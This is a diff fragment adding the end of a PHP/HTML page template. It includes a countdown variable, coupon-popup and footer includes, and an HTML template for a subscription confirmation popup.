+		var countDown = <?php echo json_encode($countDown); ?>;
+	</script>
+
+	<!-- 引入迎新考核大通关 -->
+	<?php include($view['basePath'].'/comm/newCouponPop.html'); ?>
+
+	<?php include($view['basePath'].'/footer.html');?>
+
+	<script type="text/html" id="J_subscribe_template">
+	<div class="pop_up_border J_subscribe_wraper">
+		<div class="pop_close_bar"><span class="pop_close_btn J_pop_subscribeClose"></span></div>
+		<p class="f14 bold" id="J_callbackText">{$callbackText}</p>
+		<div class="pop_ok_btn btn100"><a href="javascript:;" class="btn_comm btn100 J_pop_subscribeClose">确定</a></div>
+	</div>
+	</script>
+
+	<?php include($view['basePath'].'/comm/comScore.html'); ?>
+	<!-- index_a -->
+</body>
+</html>
